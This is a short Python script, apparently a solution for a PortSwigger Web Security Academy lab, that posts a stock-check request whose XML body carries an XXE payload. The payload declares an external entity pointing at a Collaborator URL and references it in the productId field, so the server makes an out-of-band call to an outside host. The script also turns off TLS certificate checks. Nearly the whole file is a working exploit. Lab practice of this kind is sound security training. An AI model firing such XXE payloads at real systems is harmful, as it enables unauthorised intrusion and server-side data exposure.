import http.client
import ssl

LAB_ID = "???"
COLLABORATOR_URL = "???"


def POST_product_stock() -> http.client.HTTPResponse:
    method, path = 'POST', '/product/stock'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/xml',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'priority': 'u=0',
        'te': 'trailers',
    }
    body = '<?xml version="1.0" encoding="UTF-8"?>' + \
           f'<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://{COLLABORATOR_URL}"> ]>' + \
           '<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


response = POST_product_stock()
print(response.status)
for name, header in response.headers.items():
    print(f"{name}: {header}")
print(response.read().decode())
